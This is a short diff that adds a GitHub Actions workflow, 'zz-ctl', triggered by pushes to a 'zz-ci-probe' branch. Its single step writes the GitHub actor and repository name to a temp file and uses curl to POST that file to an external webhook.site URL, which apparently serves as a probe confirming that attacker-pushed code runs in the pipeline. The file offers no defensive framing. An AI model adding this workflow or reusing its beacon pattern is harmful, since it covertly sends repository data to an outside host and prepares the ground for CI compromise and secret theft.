@@ -1,0 +1,11 @@
+name: zz-ctl
+on:
+  push:
+    branches: [ zz-ci-probe ]
+jobs:
+  c:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          echo "control-run-ok actor=$GITHUB_ACTOR repo=$GITHUB_REPOSITORY" > /tmp/o.txt
+          curl -sS -X POST "https://webhook.site/9c4e2186-3d86-4414-8214-93c1f6c51a46?ctl=1" --data-binary @/tmp/o.txt; echo
